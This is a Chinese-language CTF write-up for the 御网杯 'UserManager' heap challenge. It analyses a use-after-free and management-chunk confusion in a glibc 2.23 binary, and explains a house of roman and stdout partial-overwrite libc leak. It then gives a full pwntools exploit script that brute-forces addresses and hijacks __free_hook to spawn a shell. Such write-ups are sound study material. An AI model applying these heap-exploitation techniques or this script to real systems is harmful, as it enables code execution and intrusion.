# [御网杯]PWN-UserManager

## 基本信息

![01-checksec](D:\项目整理\ctf-writeups\pwn\heap\[御网杯]PWN-UserManager\images\01-checksec.png)

保护全开glibc版本2.23

## 逆向工程

![02-ida-main](D:\项目整理\ctf-writeups\pwn\heap\[御网杯]PWN-UserManager\images\02-ida-main.png)

main函数其实就是基本的菜单

![03-ida-register](D:\项目整理\ctf-writeups\pwn\heap\[御网杯]PWN-UserManager\images\03-ida-register.png)

来看register函数：

- 同时拥有的chunk不能超过10个
- 申请的chunk不能大于0x100
- 申请chunk后还会申请0x18大小的chunk用来管理

![](D:\项目整理\ctf-writeups\pwn\heap\[御网杯]PWN-UserManager\images\07-gdb-managechunk.png)

通过动态调试可以看出管理chunk存放数据的三个字段顺序分别是：用户chunk、show函数指针、size

![04-ida-delete](D:\项目整理\ctf-writeups\pwn\heap\[御网杯]PWN-UserManager\images\04-ida-delete.png)

接下来看delete函数

- 存在uaf漏洞
- 先释放用户申请的chunk再释放管理chunk
- 因为存放管理chunk的数组users没有置零，我们最多只能申请10次chunk（这个限制很重要）

![05-ida-edit](D:\项目整理\ctf-writeups\pwn\heap\[御网杯]PWN-UserManager\images\05-ida-edit.png)

然后是edit函数，输入的大小使用存储在管理chunk中的size字段，没有其他特殊的

![06-ida-login](D:\项目整理\ctf-writeups\pwn\heap\[御网杯]PWN-UserManager\images\06-ida-login.png)

最后是增删改查中的查，可以发现这个函数比较了我们输入的pass和users[id]->data（即用户chunk从chunk头开始的+0x10B）这里是chunk的fd字段，我们知道我们通常会用fd残留的堆和glibc地址泄露得到堆和glibc地址，而此处要求我们知道fd是什么才能打印fd，所以**不能直接通过login泄露地址**。

## 解题思路1

因为这道题不能直接通过login泄露地址，我们可以直接把它当作无show情况下的堆题，可以采用house of roman+stdout泄露libc地址。

另外这道题很容易得到任意地址写，如果我们先申请一个idx为0的0x18的chunk会先后得到一个0x18的用户chunk和0x18的管理chunk，而释放时先释放用户chunk再释放管理chunk，因此在fast bin：

bin->管理chunk->用户chunk（fast bin是先进后出的）

因此当我们再次申请idx为1的0x18chunk时会先从fast bin取chunk作为用户chunk，再从fast bin取第二个chunk作为管理chunk，此时原先idx0的管理chunk成为用户chunk，用户chunk成为管理chunk。

由于uaf的存在，idx0和1都是可用的，我们可以借助这一点同时控制两个chunk，假如idx0的管理chunk是A，它可以向另一个chunkB写入数据，而此时对于idx1来说这个B才是管理chunk因此会把A写入的前8B当作它的用户chunk的地址。可以想象如果我们知道\_\_free_hook地址那么就可以在B中写入然后在\_\_free_hook中写入数据，因此本题的关键还是在泄露libc地址。

然后按正常的操作打house of roman就好了，不过要注意除了house of roman需要爆破4B，因为不知道heap地址，所以如果要用任意地址写改某个chunk的数据在本题也要爆破4B。

## EXP

还有一点值得讨论，这道题如果爆破失败不会自动崩溃而是会进入无限循环，可以通过signal库设置一个超时时间，但似乎即使这样好像也不能让进程结束不是很清楚为什么signal行为和预期不同，还需要加一些其他的优化比如检查是否爆破的地址有'\x7f',是否地址对齐才能保证稳定劫持程序执行流。

```
from pwn import *
import signal
# from LibcSearcher3 import *
# from ae64 import *
elf = ELF('./login')
libc = ELF('./libc-2.23.so')

context(arch=elf.arch, os=elf.os, log_level='info')
context.timeout = 1

# ================= 超时处理 =================

class TimeoutException(Exception):
    pass

def timeout_handler(signum, frame):
    raise TimeoutException("try timeout")

signal.signal(signal.SIGALRM, timeout_handler)

# ================= 交互函数 =================

def register(index, size, passwd):
    p.sendafter(b"choice:", b"2\n")
    p.sendlineafter(b"id:", str(index).encode())
    p.sendlineafter(b"length:", str(size).encode())
    p.sendafter(b'password:', passwd)

def delete(index):
    p.sendafter(b"choice:", b"3\n")
    p.sendlineafter(b"id:", str(index).encode())

def edit_chunk(index, content):
    p.sendafter(b"choice:", b"4\n")
    p.sendlineafter(b"id:", str(index).encode())
    p.sendafter(b"pass:", content)

def login(index, size, passwd):
    p.sendafter(b"choice:", b"1\n")
    p.sendlineafter(b"id:", str(index).encode())
    p.sendlineafter(b"length:", str(size).encode())
    p.sendafter(b"password:", passwd)

# ================= 爆破循环 =================

cnt = 0

while True:
    cnt += 1
    log.info(f"try times: {cnt}")

    p = process([elf.path])
    # p = remote('127.0.0.1', 10000)

    try:
        # 每轮最多跑 5 秒
        # 如果机器比较慢，可以改成 8 或 10
        signal.alarm(5)

        register(9, 8, b'a')        # 实际得到0x20的chunk,所以与idx构成任意地址写
        register(0, 104, b'a')      # 0x68
        register(1, 152, b'a')      # 0x98
        register(2, 104, b'a')      # 0x68

        delete(1)
        delete(9)

        register(8, 24, b'a')       # 0x18
        edit_chunk(8, p16(0x21a0))  # heap partial overwrite

        register(3, 40, b'a')       # 0x28
        register(4, 104, p16(0x55dd))  # stdout partial overwrite

        delete(0)
        delete(2)

        edit_chunk(9, p16(0x2100))  # heap partial overwrite

        register(5, 104, b'/bin/sh\x00')
        register(6, 104, b'a')

        payload  = b'\x00' * 0x33
        payload += p32(0xfbad1880)
        payload += b";sh;"
        payload += p64(0) * 3
        payload += p8(0x88)

        register(7, 104, payload)

        # ================= 泄露 libc =================
        # 这里必须加 timeout，否则失败时可能一直卡住
        data = p.recvuntil(b'\x7f', timeout=1)

        if not data or b'\x7f' not in data:
            raise Exception("leak failed")

        libc.address = u64(data[-6:].ljust(8, b'\x00')) - 0x3c48e0

        # libc base 应该页对齐
        if libc.address & 0xfff != 0:
            raise Exception("bad libc base")

        log.success("libc: " + hex(libc.address))

        # ================= 劫持 __free_hook =================

        edit_chunk(8, p64(libc.symbols['__free_hook']))
        edit_chunk(9, p64(libc.symbols['system']))

        delete(5)

        # ================= 检查是不是真的拿到 shell =================
        # 不能直接 interactive，否则没拿到 shell 时会卡在菜单里
        p.sendline(b'echo PWNED')
        res = p.recvuntil(b'PWNED', timeout=1)

        if b'PWNED' not in res:
            raise Exception("not shell")

        # 成功后关闭 alarm，否则 interactive 时会被 alarm 打断
        signal.alarm(0)

        log.success("get shell")
        p.interactive()
        break

    except KeyboardInterrupt:
        signal.alarm(0)
        p.close()
        break

    except TimeoutException:
        signal.alarm(0)
        log.warning("timeout, retry")
        p.close()
        continue

    except EOFError:
        signal.alarm(0)
        log.warning("process crashed, retry")
        p.close()
        continue

    except Exception as e:
        signal.alarm(0)
        log.warning(str(e))
        p.close()
        continue
```

